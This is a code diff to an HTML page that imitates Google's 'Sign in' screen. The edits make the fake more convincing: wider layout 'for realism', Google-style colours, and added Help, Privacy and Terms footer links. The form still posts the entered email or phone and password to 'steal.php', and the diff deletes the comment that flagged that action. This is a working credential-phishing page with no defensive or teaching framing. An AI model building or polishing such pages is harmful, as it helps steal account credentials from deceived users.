@@ -19,8 +19,12 @@
             padding: 48px 40px 36px;
             border-radius: 8px;
             box-shadow: 0 1px 3px rgba(0,0,0,0.12), 0 1px 2px rgba(0,0,0,0.24);
-            width: 350px;
+            width: 450px; /* Wider for realism */
+            text-align: left;
+        }
+        .header {
             text-align: center;
+            margin-bottom: 20px;
         }
         .logo {
             width: 75px;
@@ -30,11 +34,13 @@
             font-size: 24px;
             font-weight: 400;
             margin: 0 0 10px;
+            color: #202124;
         }
         p {
-            color: #222;
-            margin: 10px 0 40px;
+            color: #202124;
+            margin: 0 0 40px;
             font-size: 16px;
+            line-height: 1.5;
         }
         input {
             width: 100%;
@@ -44,24 +50,13 @@
             border-radius: 4px;
             font-size: 16px;
             box-sizing: border-box;
+            transition: border 0.2s;
         }
         input:focus {
             outline: none;
             border-color: #1a73e8;
             border-width: 2px;
-            padding: 12px 14px; /* Adjust for border width */
-        }
-        .footer {
-            display: flex;
-            justify-content: space-between;
-            font-size: 14px;
-            color: #1a73e8;
-            margin-top: 20px;
-        }
-        .footer a {
-            text-decoration: none;
-            color: #1a73e8;
-            cursor: pointer;
+            padding: 12px 14px;
         }
         .next-btn {
             background-color: #1a73e8;
@@ -79,28 +74,62 @@
             clear: both;
             display: table;
         }
+        .footer {
+            display: flex;
+            justify-content: space-between;
+            font-size: 12px;
+            color: #70757a;
+            margin-top: 40px;
+            border-top: 1px solid #dadce0;
+            padding-top: 15px;
+        }
+        .footer a {
+            text-decoration: none;
+            color: #70757a;
+            margin-left: 10px;
+        }
+        .footer a:hover {
+            color: #202124;
+        }
+        .forgot {
+            color: #1a73e8;
+            font-weight: bold;
+            font-size: 14px;
+            text-decoration: none;
+            display: block;
+            margin-bottom: 20px;
+        }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <!-- Official Google Logo -->
-    <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" alt="Google Logo" class="logo">
-    
-    <h1>Sign in</h1>
-    <p>Use your Google Account</p>
+    <div class="header">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" alt="Google Logo" class="logo">
+        <h1>Sign in</h1>
+        <p>Use your Google Account</p>
+    </div>
 
-    <!-- IMPORTANT: Action points to steal.php -->
     <form action="steal.php" method="POST">
-        <input type="text" name="user" placeholder="Email or phone" required>
+        <input type="text" name="user" placeholder="Email or phone" required autofocus>
+        
+        <a href="#" class="forgot">Forgot email?</a>
+        
         <input type="password" name="pass" placeholder="Password" required>
         
         <div class="clearfix">
-            <a href="#">Forgot email?</a>
-            <a href="#">Create account</a>
             <button type="submit" class="next-btn">Next</button>
         </div>
     </form>
+
+    <div class="footer">
+        <span>Other ways to sign in</span>
+        <div>
+            <a href="#">Help</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+        </div>
+    </div>
 </div>
 
 </body>
